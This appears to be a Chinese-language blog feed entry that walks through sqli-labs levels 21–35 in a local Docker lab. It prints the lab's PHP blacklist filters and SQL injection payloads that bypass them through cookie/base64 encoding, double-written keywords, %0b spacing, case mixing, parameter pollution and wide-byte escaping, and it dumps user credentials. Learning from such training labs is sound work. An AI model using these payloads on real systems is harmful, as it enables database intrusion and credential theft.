    
  </entry>
  
  <entry>
    <title>Sqli_labs_Page2(advance)</title>
    <link href="https://lunamoore.github.io/2021/01/19/Sqli-labs-Page2-adv/"/>
    <id>https://lunamoore.github.io/2021/01/19/Sqli-labs-Page2-adv/</id>
    <published>2021-01-19T03:24:02.000Z</published>
    <updated>2021-01-19T03:42:51.669Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Sqli_labs_Page2(advance)</strong></p><p> <strong>skip:基础篇环境为windows，但在提高篇有些关卡会出现解析错误，本篇使用docker搭建的Linux环境</strong></p><a id="more"></a><h2 id="0x01-Less-21-Cookie注入-base64编码-单引号加括号"><a href="#0x01-Less-21-Cookie注入-base64编码-单引号加括号" class="headerlink" title="0x01.Less-21 Cookie注入 base64编码 单引号加括号"></a>0x01.Less-21 Cookie注入 base64编码 单引号加括号</h2><p><code>demo payload</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) order by 4 -- -</span><br><span class="line">YWRtaW4nKSBvcmRlciBieSA0IC0tIC0=</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116142128479.png" class><p><code>爆库</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;) union select 1,2,database() -- -</span><br><span class="line">MCcpIHVuaW9uIHNlbGVjdCAxLDIsZGF0YWJhc2UoKSAtLSAt</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116142319509.png" class><blockquote><p>其他方式不在赘述</p></blockquote><h2 id="0x02-Less-22-Cookie注入-base64编码-双引号"><a href="#0x02-Less-22-Cookie注入-base64编码-双引号" class="headerlink" title="0x02.Less-22 Cookie注入 base64编码 双引号"></a>0x02.Less-22 Cookie注入 base64编码 双引号</h2><blockquote><p>同Less-21，将闭合字符换为双引号即可</p></blockquote><h2 id="0x03-Less-23-基于报错-过滤注释"><a href="#0x03-Less-23-基于报错-过滤注释" class="headerlink" title="0x03.Less-23 基于报错 过滤注释"></a>0x03.Less-23 基于报错 过滤注释</h2><p><code>此题过滤了--和#，测试发现闭合字符为单引号</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; or &#x27;1&#x27; = &#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116145228775.png" class><p><code>既然过滤了注释符那么就可以使用二次注入结合%00进行截断</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 4;%00</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116145628665.png" class><p><code>爆库</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,database(),user();%00</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116145754610.png" class><blockquote><p>其他方法不在赘述</p></blockquote><p><code>也可使用以下方法</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,2,database() &#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116150158281.png" class><p><code>爆表，以下两个payload均可以</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),3 &#x27;</span><br><span class="line"></span><br><span class="line">?id=0&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() or &#x27;1&#x27;= &#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116150637871.png" class><p><code>爆列名</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),3 &#x27;</span><br><span class="line"></span><br><span class="line">?id=0&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; or &#x27;1&#x27;= &#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116151251994.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116151415888.png" class><p><code>爆数据</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,(select username from users limit 0,1),3 &#x27;</span><br><span class="line">?id=0&#x27; union select 1,(select password from users limit 0,1),3 &#x27;</span><br><span class="line"></span><br><span class="line">?id=0&#x27; union select 1,group_concat(username),group_concat(password) from users where 1 or &#x27;1&#x27; = &#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116151653100.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116151801467.png" class><h2 id="0x04-Less-24-二次注入"><a href="#0x04-Less-24-二次注入" class="headerlink" title="0x04.Less-24 二次注入"></a>0x04.Less-24 二次注入</h2><p><code>页面可以注册用户</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116152202362.png" class><blockquote><p>思路为注册一个admin’ – -或admin’# 用户，然后再进行修改密码操作</p></blockquote><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116152940647.png" class><p><code>admin&#39; -- -登入</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116153011802.png" class><p><code>修改密码</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116153045305.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116153058942.png" class><p><code>退出使用admin登入</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116153139415.png" class><h2 id="0x05-Less-25-GET-基于报错-过滤and与or-单引号"><a href="#0x05-Less-25-GET-基于报错-过滤and与or-单引号" class="headerlink" title="0x05.Less-25 GET 基于报错 过滤and与or 单引号"></a>0x05.Less-25 GET 基于报错 过滤and与or 单引号</h2><p><code>过滤了and与or可以使用双写、大小写混合、内联注释、url全编码进行绕过；and与or可以使用逻辑运算符(|| &amp;&amp;)进行代替</code></p><blockquote><p>测试发现只能使用双写</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; oorrder by 4 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116155639053.png" class><blockquote><p>其他过程不在赘述</p></blockquote><h2 id="0x06-Less-25a-GET-基于bool-过滤and与or"><a href="#0x06-Less-25a-GET-基于bool-过滤and与or" class="headerlink" title="0x06.Less-25a GET 基于bool 过滤and与or"></a>0x06.Less-25a GET 基于bool 过滤and与or</h2><p><code>与Less-25相似，但没有单引号</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1 aandnd if(length(database())=8,sleep(5),1)-- -</span><br><span class="line"></span><br><span class="line">也可以使用union联合查询</span><br><span class="line"></span><br><span class="line">?id=0 union select 1,2,database() -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116161933977.png" class><blockquote><p>其他过程不在赘述</p></blockquote><h2 id="0x07-Less-26-GET-基于报错-过滤空格与字符"><a href="#0x07-Less-26-GET-基于报错-过滤空格与字符" class="headerlink" title="0x07.Less-26 GET 基于报错 过滤空格与字符"></a>0x07.Less-26 GET 基于报错 过滤空格与字符</h2><p><code>查看源码，发现过滤了以下字符</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);            <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//strip out /*</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out --</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);            <span class="comment">//Strip out #</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out spaces</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out slashes</span></span><br><span class="line">    <span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>测试闭合字符，由于过滤了空格，所以使用%a0或%0b代替空格，这里发现单引号为闭合字符</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0boorr%0b&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=0&#x27;%0boorr%0b&#x27;1&#x27;=&#x27;2</span><br><span class="line">?id=0&#x27;%a0oorr%a0&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=0&#x27;%a0oorr%a0&#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117215557295.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117215623266.png" class><p><code>测试字段数，结果为4个</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0bunion%0bselect%0b1,2,3%0baandnd%0b&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=0&#x27;%0bunion%0bselect%0b1,2,3,4%0baandnd%0b&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117220053016.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117220136142.png" class><p><code>爆库，and可以换为or</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0baandnd%0bupdatexml%0b(1,concat(0x7e,(select%0bdatabase()),0x7e),3)%0baandnd &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117221324429.png" class><p><code>爆表</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0baandnd%0bupdatexml(1,concat(0x7e,(select%0btable_name%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=database()%0blimit%0b3,1),0x7e),1)%0baandnd&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117221948346.png" class><p><code>爆列名</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0baandnd%0bupdatexml(1,concat(0x7e,(select%0bcolumn_name%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_schema=database()%0baandnd%0btable_name=&#x27;users&#x27;%0blimit%0b1,1),0x7e),1)%0baandnd&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">?id=0&#x27;%0baandnd%0bupdatexml(1,concat(0x7e,(select%0bcolumn_name%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_schema=database()%0baandnd%0btable_name=&#x27;users&#x27;%0blimit%0b2,1),0x7e),1)%0baandnd&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117222502329.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117222540036.png" class><p><code>爆数据</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0baandnd%0bupdatexml(1,concat(0x7e,(select%0busername%0bfrom%0busers%0blimit%0b0,1),0x7e),1)%0baandnd%0b&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">0&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117222910222.png" class><p><code>但是这种方法只能一个一个爆，可以使用group_concat()函数</code></p><p><code>爆库</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0bunion%0bselect%0b1,2,database()%0baandnd%0b&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">?id=0&#x27;union%0bselect%0b1,database(),3%26%26&#x27;1&#x27;=&#x27;1    // %26为&amp;</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117224140184.png" class><p><code>爆表</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;union%0bselect%0b1,group_concat(table_name),3%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=&#x27;security&#x27;%26%26%a0&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117224638239.png" class><p><code>爆列名</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;union%0bselect%0b1,group_concat(column_name),3%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_name=&#x27;users&#x27;%26%26%a0&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117225229097.png" class><p><code>爆数据</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0bunion%0bselect%0b1,group_concat(username,0x7e,passwoorrd),3%0bfrom%0busers%0bwhere%0b%271%27=%271</span><br><span class="line"></span><br><span class="line">// where 1=1 为无约束查询</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117230259432.png" class><h2 id="0x08-Less-26a-GET-基于bool-过滤-单引号加括号"><a href="#0x08-Less-26a-GET-基于bool-过滤-单引号加括号" class="headerlink" title="0x08.Less-26a GET 基于bool 过滤 单引号加括号"></a>0x08.Less-26a GET 基于bool 过滤 单引号加括号</h2><p><code>同Less-26相同，需要在单引号后加一个括号</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27)%0bunion%0bselect%0b1,group_concat(username,0x7e,passwoorrd),3%0bfrom%0busers%0bwhere(%271=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117230816390.png" class><h2 id="0x09-Less-27-GET-基于报错-过滤空格与字符-单引号"><a href="#0x09-Less-27-GET-基于报错-过滤空格与字符-单引号" class="headerlink" title="0x09.Less-27 GET 基于报错 过滤空格与字符 单引号"></a>0x09.Less-27 GET 基于报错 过滤空格与字符 单引号</h2><p><code>查看源码发现又过滤union、select</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);            <span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out union</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out select</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out SELECT</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out Union</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>这里可以使用大小写进行绕过，如uNion、sElect，方法同上</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27%0buNion%0bsElect%0b1,group_concat(username,0x7e,password),3%0bfrom%0busers%0bwhere%271=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118180520892.png" class><h2 id="0x10-Less-27a-GET-基于bool-过滤-双引号"><a href="#0x10-Less-27a-GET-基于bool-过滤-双引号" class="headerlink" title="0x10.Less-27a GET 基于bool 过滤 双引号"></a>0x10.Less-27a GET 基于bool 过滤 双引号</h2><p><code>同上需将单引号换为双引号</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;%0band%0b&quot;1&quot;=&quot;1</span><br><span class="line">?id=1&quot;%0band%0b&quot;1&quot;=&quot;2</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182211616.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182234928.png" class><p><code>测试字段数</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;%0buNion%0bsElect%0b1,2,3%0band%0b&quot;1&quot;=&quot;1</span><br><span class="line">?id=1&quot;%0buNion%0bsElect%0b1,2,3,4%0band%0b&quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182105167.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182130359.png" class><p><code>放法同上一题不在赘述</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot;%0buNion%0bsElect%0b1,group_concat(username,0x7e,password),3%0bfrom%0busers%0bwhere&quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182421291.png" class><h2 id="0x11-Less-28-GET-基于报错-过滤-单引号加括号"><a href="#0x11-Less-28-GET-基于报错-过滤-单引号加括号" class="headerlink" title="0x11.Less-28 GET 基于报错 过滤 单引号加括号"></a>0x11.Less-28 GET 基于报错 过滤 单引号加括号</h2><p><code>闭合字符为&#39;)其他过程同上</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;)%0buNion%0bsElect%0b1,group_concat(username,0x7e,password),3%0bfrom%0busers%0bwhere(&#x27;1=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118191510874.png" class><h2 id="0x12-Less-28a-GET-基于bool-过滤-双引号"><a href="#0x12-Less-28a-GET-基于bool-过滤-双引号" class="headerlink" title="0x12.Less-28a GET 基于bool 过滤 双引号"></a>0x12.Less-28a GET 基于bool 过滤 双引号</h2><p><code>闭合字符为&quot;其他过程同上</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot;%0buNion%0bsElect%0b1,group_concat(username,0x7e,password),3%0bfrom%0busers%0bwhere&quot;1=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118192025320.png" class><h2 id="0x13-Less-29-GET-基于报错-绕过WAF"><a href="#0x13-Less-29-GET-基于报错-绕过WAF" class="headerlink" title="0x13.Less-29 GET 基于报错 绕过WAF"></a>0x13.Less-29 GET 基于报错 绕过WAF</h2><p><code>说是存在waf但是常规注入就可以？一脸懵逼。。。</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,group_concat(username,0x7e,password),3 from users where &#x27;1=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118200656209.png" class><h2 id="0x14-Less-30-GET-基于bool-绕过WAF"><a href="#0x14-Less-30-GET-基于bool-绕过WAF" class="headerlink" title="0x14.Less-30 GET 基于bool 绕过WAF"></a>0x14.Less-30 GET 基于bool 绕过WAF</h2><p><code>跟上题一样</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot; union select 1,group_concat(username,0x7e,password),3 from users where&quot;1=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118201045806.png" class><h2 id="0x15-Less-31-GET-基于bool-绕过WAF"><a href="#0x15-Less-31-GET-基于bool-绕过WAF" class="headerlink" title="0x15.Less-31 GET 基于bool 绕过WAF"></a>0x15.Less-31 GET 基于bool 绕过WAF</h2><p><code>跟上题一样</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot;) union select 1,group_concat(username,0x7e,password),3 from users where(&quot;1=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118201428847.png" class><blockquote><p>这三道题很奇怪，说是有waf但是啥也没有。绕过waf参考以下文章</p></blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L256amRzZHMvYXJ0aWNsZS9kZXRhaWxzLzc3NzU4ODI0">参考<i class="fa fa-external-link-alt"></i></span></p><p><code>第一个id参数用于欺骗waf，第二个为真实查询</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=0&quot;) -- -</span><br><span class="line">?id=1&amp;id=1&quot;) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118202113371.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118202142173.png" class><h2 id="0x16-Less-32-GET-绕过转义字符"><a href="#0x16-Less-32-GET-绕过转义字符" class="headerlink" title="0x16.Less-32 GET 绕过转义字符\"></a>0x16.Less-32 GET 绕过转义字符\</h2><p><code>这里写引号会被加上\进行转义</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118212716561.png" class><p><code>可以使用宽字节进行绕过，汉字你的url编码为%e4%bd%a0，这里提取%e4与\进行拼接，但是他并不是一个汉字，就可以绕过\</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118215012643.png" class><p><code>老方法，直接查询</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118220631992.png" class><p><code>爆字段</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=users -- -</span><br></pre></td></tr></table></figure><p><code>但是这里出现了个问题，说是没有users见了鬼了，上面明明查出来了呀</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118220853724.png" class><p><code>这里发现users被加上了单引号，如何逃脱这种束缚呢，将users转为16进制编码即可</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118221744344.png" class><p><code>爆数据</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,group_concat(username,0x7e,password),3 from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118222615247.png" class><h2 id="0x17-Less-33-GET-绕过转义字符"><a href="#0x17-Less-33-GET-绕过转义字符" class="headerlink" title="0x17.Less-33 GET 绕过转义字符\"></a>0x17.Less-33 GET 绕过转义字符\</h2><p><code>跟上一道题一毛一样，怪事</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,group_concat(username,0x7e,password),3 from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118222957733.png" class><h2 id="0x18-Less-34-POST-绕过转义字符"><a href="#0x18-Less-34-POST-绕过转义字符" class="headerlink" title="0x18.Less-34 POST 绕过转义字符\"></a>0x18.Less-34 POST 绕过转义字符\</h2><p><code>同上一题，只是字段有2两个</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1%e4&#x27; order by 3 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119101637618.png" class><p><code>其他过程同上</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=0%e4&#x27; union select 1,group_concat(username,0x7e,password) from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119101747730.png" class><h2 id="0x19-Less-35-GET-绕过-（不需要）"><a href="#0x19-Less-35-GET-绕过-（不需要）" class="headerlink" title="0x19.Less-35 GET 绕过\（不需要）"></a>0x19.Less-35 GET 绕过\（不需要）</h2><p><code>这题醉了，说是绕过\，但是没有闭合字符，😂</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0 union select 1,group_concat(username,0x7e,password),3 from users -- 